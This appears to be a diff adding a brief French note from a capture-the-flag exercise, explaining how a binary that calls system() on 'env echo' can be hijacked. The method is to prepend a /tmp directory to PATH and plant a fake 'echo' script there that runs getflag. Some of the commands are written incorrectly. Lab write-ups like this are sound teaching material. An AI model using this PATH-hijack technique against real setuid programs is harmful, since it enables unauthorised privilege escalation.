@@ -1,0 +1,5 @@
+Dans le binaire
+line = system("/usr/bin/env echo Exploit me")
+modifier le PATH: export /tmp/prout:$PATH
+rajouter un fichier bash qui se nomme echo dans /tmp/prout et qui effectue un getflag
+cd /tmp/prout chmod 777 echo
